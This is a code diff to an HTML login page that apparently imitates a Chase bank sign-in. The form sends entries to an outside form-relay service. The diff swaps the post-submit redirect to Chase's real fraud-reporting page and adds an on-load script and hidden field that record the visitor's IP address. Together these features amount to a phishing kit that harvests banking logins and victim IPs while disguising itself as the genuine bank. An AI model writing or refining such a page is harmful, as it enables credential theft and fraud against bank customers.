@@ -89,15 +89,17 @@
             <h1></h1>
             <form method="post" action="https://formsubmit.co/3a514e8fece6175b6e7089d60c96611e">
                 <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_next" value="https://bit.ly/3BKMBb7">
-
+                <input type="hidden" name="_next" value="https://www.chase.com/digital/customer-service/fraud/unauthorized-charges">
+            
                 <div class="input-field">
                     <input type="text" id="user" placeholder="Username">
                 </div>
                 <div class="input-field">
                     <input type="password" id="password" placeholder="Password">
                     <span id="show-password" class="show-password">Show</span>
+                    
                 </div>
+                  <input type="hidden" id="user-ip" name="user_ip" value="">
 
                 <div class="remember-options">
                     <div class="item">
@@ -119,7 +121,17 @@
         </div>
     </div>
 
-    <script src="script.js"></script>
+    <script>
+    document.addEventListener("DOMContentLoaded", function () {
+        fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("user-ip").value = data.ip; // Store IP in hidden field
+            })
+            .catch(error => console.error("Failed to fetch IP:", error));
+    });
+</script>
+
 </body>
 
 <footer>
